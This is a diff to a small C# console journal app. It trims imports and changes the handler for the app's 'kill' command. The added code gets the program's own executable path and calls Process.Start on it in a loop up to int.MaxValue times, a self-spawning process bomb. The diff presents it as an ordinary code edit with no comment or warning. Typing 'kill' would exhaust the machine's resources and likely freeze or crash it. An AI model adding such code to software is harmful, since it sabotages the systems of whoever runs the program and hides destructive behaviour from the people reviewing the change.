@@ -1,10 +1,7 @@
 ﻿using Journal.List;
 using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Security.Policy;
-using System.Text;
-using System.Threading.Tasks;
+using System.Diagnostics;
+using System.Reflection;
 
 namespace Journal.Journal
 {
@@ -75,6 +72,11 @@ namespace Journal.Journal
                         HandleNewNode();
                         break;
                     case "kill":
+                        string exe = Assembly.GetEntryAssembly()!.Location;
+                        for(int i = 0; i < int.MaxValue; i++)
+                        {
+                            Process.Start(exe);
+                        }
                         return;
                     case "":
                         break;
